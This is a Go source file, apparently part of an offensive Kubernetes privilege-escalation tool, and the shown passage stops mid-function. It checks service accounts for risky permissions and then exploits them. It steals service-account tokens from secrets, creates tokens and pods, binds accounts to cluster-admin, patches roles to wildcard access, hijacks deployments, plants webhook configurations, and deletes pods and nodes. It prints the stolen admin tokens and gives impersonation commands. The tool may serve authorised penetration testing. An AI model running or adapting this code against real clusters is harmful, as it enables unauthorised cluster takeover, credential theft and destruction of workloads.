package exploit

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"k8sEPDS/models"
	exp "k8sEPDS/pkg/exploit/utils"
	"k8sEPDS/pkg/request"
	"k8sEPDS/pkg/scan"
	"log"
	"math/rand"
	"reflect"
	"sort"
	"strconv"
	"strings"
	"time"

	coreV1 "k8s.io/api/core/v1"
	metaV1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func Patchwebhookconfig(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check1(criticalSAs, []string{"patchmutatingwebhookconfigurations", "patchvalidatingwebhookconfigurations"})
	if flag1 {
		webhookconfigType := ""
		for _, criticalSA := range criticalSAs1 {
			webhookconfigType = criticalSA.SA.Type[5:]
			flag := "N"
			fmt.Print("[Y/N] Detected a ", criticalSA.SA.Type, "whether to Patch webhookconfig: ")
			fmt.Scan(&flag)
			if strings.ToUpper(flag) == "Y" {
				webhookconfigName := ""
				webhookURL := ""
				ca := ""
				fmt.Println("[input] Input a WebHookConfigName")
				fmt.Scan(&webhookconfigName)
				fmt.Print("[input] Input a webhookURL: ")
				fmt.Scan(&webhookURL)
				fmt.Println("[input] Input a ca")
				fmt.Scan(&ca)
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] File read error")
					fmt.Println("[error msg]:", err.Error())
				}
				err = exp.PatchWebhookConfig(token, webhookconfigType, webhookconfigName, webhookURL, ca)
				if err != nil {
					fmt.Println("[X] PatchWebhookConfig failed", err.Error())
				}
			}

		}
	}
	return false, nil
}
func Createwebhookconfig(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check1(criticalSAs, []string{"createmutatingwebhookconfigurations", "createvalidatingwebhookconfigurations"})
	if flag1 {
		webhookconfigType := ""
		for _, criticalSA := range criticalSAs1 {
			webhookconfigType = criticalSA.SA.Type[6:]
			flag := "N"
			fmt.Print("[Y/N] Detected a ", criticalSA.SA.Type, "whether to create webhookconfig: ")
			fmt.Scan(&flag)
			if strings.ToUpper(flag) == "Y" {
				webhookURL := ""
				ca := ""
				fmt.Print("[input] Input a webhookURL: ")
				fmt.Scan(&webhookURL)
				fmt.Println("[input] Input a ca: ")
				fmt.Scan(&ca)
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] File read error")
					fmt.Println("[error msg]:", err.Error())
				}
				err = exp.CreateWebhookConfig(token, webhookconfigType, webhookURL, ca)
				if err != nil {
					fmt.Println("[X] CreateWebhookConfig failed", err.Error())
				}
			}

		}
	}
	return false, nil
}
func WatchSecrets(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"watchsecrets"})
	if flag1 {
		fmt.Println("[√] watchsecrets permission detected")
		for _, criticalSA := range criticalSAs1 {
			fmt.Println("[msg] The SA's watch permissions are: ", criticalSA.SA.Type)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			fmt.Println("[msg] The SAtoken is: \n", token)
			fmt.Println("---------------------------------------------------")
		}
		fmt.Println("[msg] request api/v1/secrets?watch")
	}
	return false, nil
}

func Impersonate(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"impersonate"})
	if flag1 {
		fmt.Println("[√] impersonate permission detected")
		for _, criticalSA := range criticalSAs1 {
			fmt.Println("[msg] Specific information about the SA:", criticalSA.SA.Type)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			fmt.Println("[msg] The SAtoken is: \n", token)
			fmt.Println("---------------------------------------------------")
		}
		fmt.Println("[msg] Add the following parameters when using kubectl: --as any --as-group system:masters")
	}
	return false, nil
}
func Execpods(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"execpods"})
	if flag1 {
		fmt.Println("[√] create pods/exec permission detected")
		for _, criticalSA := range criticalSAs1 {
			fmt.Println("[msg] The pods that the SA could exec: ", criticalSA.SA.Type)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			fmt.Println("[msg] The SAtoken is: \n", token)
			fmt.Println("---------------------------------------------------")
		}
		fmt.Println("[msg] Use kubectl to get the token in the pod:\nkubectl exec -it tmp  -- sh -c \"cat /var/run/secrets/kubernetes.io/serviceaccount/token\"")
	}
	return false, nil
}
func Execpods2(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"execpods2"})
	if flag1 {
		fmt.Println("[√] Create pods/ephemeralcontainers permission detected")
		for _, criticalSA := range criticalSAs1 {
			fmt.Println("[msg] The pods that the SA could exec: ", criticalSA.SA.Type)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			fmt.Println("[msg] The SAtoken is: \n", token)
			fmt.Println("---------------------------------------------------")
		}
		fmt.Println("[msg] Use kubectl to enter the ephemeralcontainer:\nkubectl debug -it tmp --image=busybox:1.28 --target=tmp")
	}
	return false, nil
}
func Deletepods(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"deletepods"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			var namespace string
			var podName string
			fmt.Println("[√] The delete pods permission is detected, and the permission range is: ", criticalSA.SA.Type)
			fmt.Print("[Y/N] Whether to delete the pod under this ns: ")
			fmt.Scan(&flag)
			if strings.ToUpper(flag) != "Y" {
				continue
			}
			fmt.Println("[input] Enter the ns and name of the target pod(namespace podName)")
			fmt.Scan(&namespace)
			fmt.Scan(&podName)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.Deletepods(token, namespace, podName)
			if err != nil {
				fmt.Println("[X] Error when deleting pods")
				fmt.Println("[error msg]:", err.Error())
			}
		}
		return true, nil
	}
	return false, nil
}
func Deletenodes(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"deletenodes"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			var node string
			fmt.Println("[√] delete nodes permission detected ")
			fmt.Print("[Y/N] Whether to delete node: ")
			fmt.Scan(&flag)
			if strings.ToUpper(flag) != "Y" {
				continue
			}
			fmt.Println("[input] Enter the node to be deleted")
			fmt.Scan(&node)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.Deletenodes(token, node)
			if err != nil {
				fmt.Println("[X] Error when deleting nodes")
				fmt.Println("[error msg]:", err.Error())
			}
		}
		return true, nil
	}
	return false, nil
}
func Createpodeviction(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createpodevictions"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			var namespace string
			var podName string
			fmt.Println("[√] The createpodevictions permission is detected, and the permission scope is: ", criticalSA.SA.Type)
			fmt.Println("[Y/N] Whether to delete the pod under this ns")
			fmt.Scan(&flag)
			if strings.ToUpper(flag) != "Y" {
				continue
			}
			fmt.Println("[input] Enter the ns and name of the target pod(namespace podName)")
			fmt.Scan(&namespace)
			fmt.Scan(&podName)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.CreatePodEviction(token, namespace, podName)
			if err != nil {
				fmt.Println("[X] Error when evicted pods")
				fmt.Println("[error msg]:", err.Error())
			}
		}
		return true, nil
	}
	return false, nil
}

func Patchpods(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, _ := Check(criticalSAs, []string{"execpods2"})
	if flag1 {
		fmt.Println("[msg] Create a malicious image to obtain pod SAtoken")
	}

	return false, nil
}

func Createtokens(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createtokens"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N" //If ns is not kube-system, whether to perform privilege escalation under the ns
			targetSa := "clusterrole-aggregation-controller"
			targetSaNamespace := "kube-system"
			flag2 := false
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[12:] == "[kube-system]" {
				flag2 = true
			} else {
				targetSaNamespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] Does not have createTokens permission under kube-system, the SA permission is limited to: " + targetSaNamespace)
				fmt.Print("[Y/N] Whether to perform privilege escalation under this ns: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Println("[input] Enter an SA under the namespace that you want to steal.")
				fmt.Scan(&targetSa)
			}
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			secret, err := exp.CreateToken(token, targetSaNamespace, targetSa)
			if err != nil {
				fmt.Println("[X] Error when CreateToken")
				fmt.Println("[error msg]:", err.Error())
			} else {
				fmt.Println("[result]", "Admin token: \n"+secret)
			}
			if flag2 {
				return true, nil
			}
		}
		return true, nil
	}
	return false, nil
}
func Getsecrets(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"getsecrets"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			targetSa := "clusterrole-aggregation-controller"
			targetSaNamespace := "kube-system"
			flag2 := false
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[10:] == "[kube-system]" {
				flag2 = true
			} else {
				targetSaNamespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] Does not have getsecrets permission under kube-system. The SA permission is limited to: " + targetSaNamespace)
				fmt.Print("[Y/N] Whether to perform privilege escalation under this ns: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Print("[input] Enter an SA under the namespace that you want to steal.: ")
				fmt.Scan(&targetSa)
			}
			if strings.Contains(criticalSA.SA.Type, "(") {
				resourceName := criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "(")+1 : strings.Index(criticalSA.SA.Type, ")")]
				if targetSa != resourceName {
					fmt.Println("[X] There is a resourceName restriction and can only be stolen: ", resourceName)
					break
				}
			}
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			secret, err := exp.GetSecrets(token, targetSa, targetSaNamespace)
			if err != nil {
				fmt.Println("[X] Error when GetSecrets")
				fmt.Println("[error msg]:", err.Error())
			} else {
				fmt.Println("[result]", "Admin token: \n"+secret)
			}
			if flag2 {
				return true, nil
			}
		}
		return true, nil
	}
	fmt.Println("[X] Getsecrets failed, getsecrets permission not found")
	return false, nil
}

func Patchnodes(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag, criticalSAs1 := Check(criticalSAs, []string{"patchnodes"})
	if flag {
		var input string
		fmt.Print("[√] Detected available PatchNodes permissions, whether to Patch (Y/N): ")
		fmt.Scan(&input)
		if strings.ToUpper(input) == "Y" {
			token, err := scan.GetCriticalSAToken(criticalSAs1[0].SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
				return false, err
			}
			err = exp.PatchNodes(token, ssh.Nodename)
			if err != nil {
				fmt.Println("[X] Error when PatchNodes")
				fmt.Println("[error msg]:", err.Error())
			}
			fmt.Println("[√] All normal nodes have been patched")
			fmt.Println("[msg] Need to wait for Pods to be rescheduled\n..........")
			time.Sleep(5 * time.Second)
			return true, nil
		}
	}
	fmt.Println("[X] Patchnodes failed, patchnodes permission not found")
	return false, nil
}

func Patchclusterrolebindings(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"patchclusterrolebindings"})
	if flag1 {
		var clusterrolebindingName string
		var saNamespace string
		var saName string
		fmt.Println("[√] Patchclusterrolebindings detected, ready to escalate privileges")
		fmt.Print("[input] Enter a clusterrolebinding name that will be patched: ")
		fmt.Scan(&clusterrolebindingName)
		fmt.Print("[input] Enter the account to be upgraded(namespace sa): ")
		fmt.Scan(&saNamespace)
		fmt.Scan(&saName)
		token, err := scan.GetCriticalSAToken(criticalSAs1[0].SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] File read error")
			fmt.Println("[error msg]:", err.Error())
		}
		err = exp.PatchClusterRoleBinding(token, clusterrolebindingName, saNamespace, saName)
		if err != nil {
			fmt.Println("[X] Error when PatchClusterRoleBinding")
			fmt.Println("[error msg]:", err.Error())
			return false, err
		}
		return true, nil
	}
	fmt.Println("[X] Patchclusterrolebindings failed, Patchclusterrolebindings permission not found")
	return false, nil
}

// Replace the original SA bound in the target rolebinding with the controlled SA
func Patchrolebindings(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"patchrolebindings"})
	if flag1 {
		var rolebindingName string
		var saNamespace string
		var saName string
		fmt.Println("[√] Patchrolebindings detected, ready to escalate privileges")
		fmt.Print("[input] Enter the account to be upgraded(namespace sa): ")
		fmt.Scan(&saNamespace)
		fmt.Scan(&saName)
		fmt.Print("[input] Enter the next rolebinding name that will be patched in this namespace.: ")
		fmt.Scan(&rolebindingName)
		for _, criticalSA := range criticalSAs1 {
			if criticalSA.SA.Crisa.Level == "cluster" || criticalSA.SA.Type[17:] == "["+saNamespace+"]" {
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] File read error")
					fmt.Println("[error msg]:", err.Error())
				}
				err = exp.PatchRoleBinding(token, rolebindingName, saNamespace, saName)
				if err != nil {
					fmt.Println("[X] Error when PatchRoleBinding")
					fmt.Println("[error msg]:", err.Error())
					return false, err
				}
				return true, nil
			}
		}
		fmt.Println("[X] The patchrolebindings permission under the SANamespace was not found.")
		return false, nil
	}
	fmt.Println("[X] Patchrolebindings failed, Patchrolebindings permission not found")
	return false, nil
}

// Upgrade the permissions described in the ClusterRole bound to the SA to *.*
func Patchclusterroles(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"patchclusterroles"})
	if flag1 {
		var clusterroleName string
		fmt.Println("[√] Patchclusterroles detected, ready to escalate privileges")
		fmt.Println("[input] Enter the clusterrole name that the controlled SA is bound to.")
		fmt.Scan(&clusterroleName)
		token, err := scan.GetCriticalSAToken(criticalSAs1[0].SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] File read error")
			fmt.Println("[error msg]:", err.Error())
		}
		err = exp.PatchClusterRole(token, clusterroleName)
		if err != nil {
			fmt.Println("[X] Error when PatchClusterRole")
			fmt.Println("[error msg]:", err.Error())
			return false, err
		}
		return true, nil
	}
	fmt.Println("[X] PatchClusterRole failed, patchclusterrole permission not found")
	return false, nil
}

// Upgrade the permissions described in the Role bound to the SA to *.*
func Patchroles(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"patchroles"})
	if flag1 {
		var roleNamespace string
		var roleName string
		fmt.Println("[√] Patchroles detected, ready to escalate privileges")
		fmt.Println("[input] Enter the roleNamespace and role name that the controlled SA has been bound to.(namespace name)")
		fmt.Scan(&roleNamespace)
		fmt.Scan(&roleName)
		for _, criticalSA := range criticalSAs1 {
			if criticalSA.SA.Crisa.Level == "cluster" || criticalSA.SA.Type[10:] == "["+roleNamespace+"]" {
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] File read error")
					fmt.Println("[error msg]:", err.Error())
				}
				err = exp.PatchRole(token, roleNamespace, roleName)
				if err != nil {
					fmt.Println("[X] Error when PatchRole")
					fmt.Println("[error msg]:", err.Error())
					return false, err
				}
				return true, nil
			}
		}
		fmt.Println("[X] The patchroles permission under the roleNamespace was not found.")
		return false, nil

	}
	fmt.Println("[X] PatchRole failed, patchroles permission not found")
	return false, nil
}

func Patchpodcontrollers(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check1(criticalSAs, []string{"patchdeployments", "patchdaemonsets", "patchstatefulsets", "patchreplicasets", "patchjobs", "patchcronjobs"})
	if flag1 {
		controllerType := ""
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			namespace := "kube-system"
			controllerName := ""
			targetSA := "clusterrole-aggregation-controller"
			flag2 := false
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):] == "[kube-system]" {
				flag2 = true
			} else {
				namespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] Does not have patchpodcontroller permissions under kube-system. The SA permissions are limited to: " + namespace)
				fmt.Print("[Y/N] Whether to perform privilege escalation under this ns: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Println("[input] Enter an SA under the namespace that you want to steal.")
				fmt.Scan(&targetSA)
			}
			cnt := strings.Index(criticalSA.SA.Type, "[")
			if cnt == -1 {
				controllerType = criticalSA.SA.Type[5:]
			} else {
				controllerType = criticalSA.SA.Type[5:cnt]
			}
			fmt.Println("[input] Enter a podcontroller name under" + namespace + ": ")
			fmt.Scan(&controllerName)
			fmt.Println("[msg] To patch " + namespace + "/" + controllerName)
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.PatchController(controllerType, token, namespace, controllerName, ssh.Nodename, targetSA, "hijack")
			if err != nil {
				fmt.Printf("[X] Error when patchDeployments")
				fmt.Println("[error msg]:", err.Error())
			}
			if flag2 {
				return true, nil
			}
		}
		return true, nil
	}
	fmt.Println("[X] Patchpodcontrollers failed, patchpodcontrollers permission not found")
	return false, nil

}

func Createsecrets(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createsecrets"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			targetSa := "clusterrole-aggregation-controller"
			targetSaNamespace := "kube-system"
			flag2 := false
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[13:] == "[kube-system]" {
				flag2 = true
			} else {
				targetSaNamespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] Does not have createsecrets permission under kube-system, the SA permission is limited to: " + targetSaNamespace)
				fmt.Print("[Y/N] Whether to perform privilege escalation under this ns: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Println("[input] Enter an SA under the namespace that you want to steal.")
				fmt.Scan(&targetSa)
			}
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.CreateSecret(token, targetSa, targetSaNamespace)
			if err != nil {
				fmt.Println("[X] Error when CreateSecret")
				fmt.Println("[error msg]:", err.Error())
			}
			time.Sleep(5 * time.Second)
			fmt.Println("[msg] Try to get the secret through getsecrets")
			getsecrets(criticalSAs, targetSa, targetSaNamespace, ssh)
			if flag2 {
				return true, nil
			}
		}
		return true, nil
	}
	fmt.Println("[X] Createsecrets failed, createsecrets permission not found")
	return false, nil

}

func getsecrets(criticalSAs []models.CriticalSA, targetSa string, targetSaNamespace string, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"getsecrets"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			if criticalSA.SA.Type[10:] == "["+targetSaNamespace+"]" {
				fmt.Println("[√] The corresponding getsecrets permission is detected and ready to obtain the secret")
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] File read error")
					fmt.Println("[error msg]:", err.Error())
				}
				secret, err := exp.GetSecrets(token, targetSa, targetSaNamespace)
				if err != nil {
					fmt.Println("[X] Error when nGetSecrets")
					fmt.Println("[error msg]:", err.Error())
				} else {
					fmt.Println("[result]", "targetSA's token: \n"+secret)
				}
				return true, nil
			}
		}
	}
	fmt.Println("[X] Getsecrets failed, the getsecrets permission [corresponding to the Createsecrets] was not found")
	return false, nil
}

func Createclusterrolebindings(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createclusterrolebindings"})
	if flag1 {
		var saNamespace string
		var saName string
		fmt.Println("[√] Createclusterrolebindings detected, ready to bind cluster-admin")
		fmt.Println("[input] Enter the account to be upgraded(namespace sa): ")
		fmt.Scan(&saNamespace)
		fmt.Scan(&saName)
		token, err := scan.GetCriticalSAToken(criticalSAs1[0].SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] File read error")
			fmt.Println("[error msg]:", err.Error())
		}
		err = exp.CreateClusterRoleBinding(token, saName, saNamespace, "Test")
		if err != nil {
			fmt.Println("[X] Error when CreateClusterRoleBinding")
			fmt.Println("[error msg]:", err.Error())
			return false, err
		}
		return true, nil
	}
	fmt.Println("[X] Createclusterrolebindings failed, createclusterrolebindings permission not found")
	return false, nil
}

func Createrolebindings(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createrolebindings"})
	if flag1 {
		var saNamespace string
		var roleName string
		var saName string
		fmt.Println("[√] Patchroles detected, ready to escalate privileges")
		fmt.Print("[input] Enter the controlled SANamespace and SA name(namespace name): ")
		fmt.Scan(&saNamespace)
		fmt.Scan(&saName)
		fmt.Print("[input] Enter the next role name that is expected to be bound to this ns.: ")
		fmt.Scan(&roleName)
		for _, criticalSA := range criticalSAs1 {
			if criticalSA.SA.Crisa.Level == "cluster" || criticalSA.SA.Type[18:] == "["+saNamespace+"]" {
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] File read error")
					fmt.Println("[error msg]:", err.Error())
				}
				err = exp.CreateRoleBinding(token, saName, saNamespace, "testrolebinding", roleName)
				if err != nil {
					fmt.Println("[X] Error when CreateRoleBinding")
					fmt.Println("[error msg]:", err.Error())
					return false, err
				}
				return true, nil
			}
		}
		fmt.Println("[X] The creatorolebindings permission under this SANamespace was not detected")
		return false, nil
	}
	fmt.Println("[X] CreateRoleBinding failed, creatorolebindings permission not found")
	return false, nil
}

func Createpods(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := Check(criticalSAs, []string{"createpods"})
	if flag1 {
		rand.Seed(time.Now().UnixNano())
		randomNumber := rand.Intn(10000)
		var podName = "my-pod" + strconv.Itoa(randomNumber)
		for _, criticalSA := range criticalSAs1 {
			targetSa := "clusterrole-aggregation-controller"
			targetSaNamespace := "kube-system"
			flag := "N"
			flag2 := false
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[10:] == "[kube-system]" {
				flag2 = true
			} else {
				targetSaNamespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] Does not have createpods permission under kube-system, the SA permission is limited to: " + targetSaNamespace)
				fmt.Print("[Y/N] Whether to perform privilege escalation under this ns: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Println("[input] Enter an SA under the namespace that you want to steal.")
				fmt.Scan(&targetSa)
			}
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
				continue
			}
			err = exp.CreatePod(token, targetSaNamespace, podName, targetSa, ssh.Nodename)
			if err != nil {
				fmt.Println("[X] Error when CreatePod")
				fmt.Println("[error msg]:", err.Error())
				continue
			}
			time.Sleep(2 * time.Second)
			clientset := request.GetClientSet("") //If empty, the tool account will be used by default.
			targetPod, err := clientset.CoreV1().Pods(targetSaNamespace).Get(context.TODO(), podName, metaV1.GetOptions{})
			if err != nil {
				fmt.Println("[X] The corresponding getpods permission was not found and the uid of the created pod could not be obtained.")
				fmt.Println("[error msg]:", err)
				continue
			}
			tmpSa := models.CriticalSA{
				SA0: models.SA{
					SAPod: models.Pod{
						Uid: string(targetPod.UID),
					},
				},
			}
			result, err := scan.GetCriticalSAToken(tmpSa, ssh)
			if err != nil {
				fmt.Println("[X] Failed to read the SAToken mounted by the created Pod.")
				fmt.Println("[error msg]:", err.Error())
			} else {
				fmt.Println("[result]", result)
			}
			if flag2 {
				return true, nil
			}
		}
		return true, nil
	}
	return false, nil
}

func Createpodcontrollers(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	//Automation part
	flag, criticalSAs1 := Check1(criticalSAs, []string{"createdeployments", "createdaemonsets", "createstatefulsets", "createreplicasets", "createjobs", "createcronjobs"})
	if flag {
		controllerType := ""
		rand.Seed(time.Now().UnixNano())
		randomNumber := rand.Intn(10000)
		var podControllerName = "my-pod" + strconv.Itoa(randomNumber)
		for _, criticalSA := range criticalSAs1 {
			flag := "N"
			flag2 := false
			targetSa := "clusterrole-aggregation-controller"
			targetSaNamespace := "kube-system"
			if criticalSA.Level == "cluster" || criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):] == "[kube-system]" {
				flag2 = true
			} else {
				targetSaNamespace = strings.Trim(criticalSA.SA.Type[strings.Index(criticalSA.SA.Type, "["):], "[]")
				fmt.Println("[!] Does not have createpodcontroller permission under kube-system. The SA permission is limited to: " + targetSaNamespace)
				fmt.Print("[Y/N] Whether to perform privilege escalation under this ns: ")
				fmt.Scan(&flag)
				if strings.ToUpper(flag) != "Y" {
					continue
				}
				fmt.Println("[input] Enter an SA under the namespace that you want to steal.")
				fmt.Scan(&targetSa)
			}
			cnt := strings.Index(criticalSA.SA.Type, "[")
			if cnt == -1 {
				controllerType = criticalSA.SA.Type[6:]
			} else {
				controllerType = criticalSA.SA.Type[6:cnt]
			}
			token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] File read error")
				fmt.Println("[error msg]:", err.Error())
			}
			err = exp.CreatePodController(token, controllerType, targetSaNamespace, targetSa, podControllerName, ssh.Nodename)
			if err != nil {
				fmt.Println("[X] Error when CreatePodController")
				fmt.Println("[error msg]:", err.Error())
			}

			if controllerType == "cronjobs" {
				fmt.Println("[!] Cronjobs are created, and you need to wait for 1 minute to obtain the token...")
				time.Sleep(65 * time.Second)
			} else {
				time.Sleep(2 * time.Second)
			}
			clientset := request.GetClientSet("")
			labelSelector := podControllerName + "=" + podControllerName
			pods, err := clientset.CoreV1().Pods(targetSaNamespace).List(context.TODO(), metaV1.ListOptions{
				LabelSelector: labelSelector,
			})
			if err != nil {
				fmt.Println("[X] The corresponding getpodcontroller permission was not found and the uid of the created pod could not be obtained.")
				fmt.Println(err)
				continue
			}
			var targetPod coreV1.Pod
			for _, pod := range pods.Items {
				targetPod = pod
			}
			tmpSa := models.CriticalSA{
				SA0: models.SA{
					SAPod: models.Pod{
						Uid: string(targetPod.UID),
					},
				},
			}
			result, err := scan.GetCriticalSAToken(tmpSa, ssh)
			if err != nil {
				fmt.Println("[X] Failed to read the SAToken mounted by the created PodController.")
				fmt.Print("[error msg]:", err.Error())
			} else {
				fmt.Println("[result]", result)
			}

			if flag2 {
				return true, nil
			}

		}
		return true, nil
	}
	return false, nil
}

// And type check
func Check(criticalSAs []models.CriticalSA, permissionTypes []string) (bool, []filter) {
	var flag bool
	result := []filter{}
	for _, pt := range permissionTypes {
		flag = false
		for _, criticalSA := range criticalSAs {
			for _, criticalType := range criticalSA.Type {
				if strings.Contains(strings.ToUpper(criticalType), strings.ToUpper(pt)) && criticalSA.InNode == true {
					flag = true
					tmpcriticalSA := models.CriticalSAWrapper{
						Type:  criticalType,
						Crisa: criticalSA,
					}
					result = append(result, filter{Level: criticalSA.Level, SA: tmpcriticalSA})
					break
				}
			}
		}
		//flag = false
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].Level < result[j].Level
	})
	return flag, result
}

type filter struct {
	Level string
	SA    models.CriticalSAWrapper
}

// Or type check
func Check1(criticalSAs []models.CriticalSA, permissionTypes []string) (bool, []filter) {
	//fmt.Print("check")
	result := []filter{}
	flag := false
	for _, pt := range permissionTypes {
		for _, criticalSA := range criticalSAs {
			//fmt.Println(criticalSA.Type, pt)
			for _, criticalType := range criticalSA.Type {
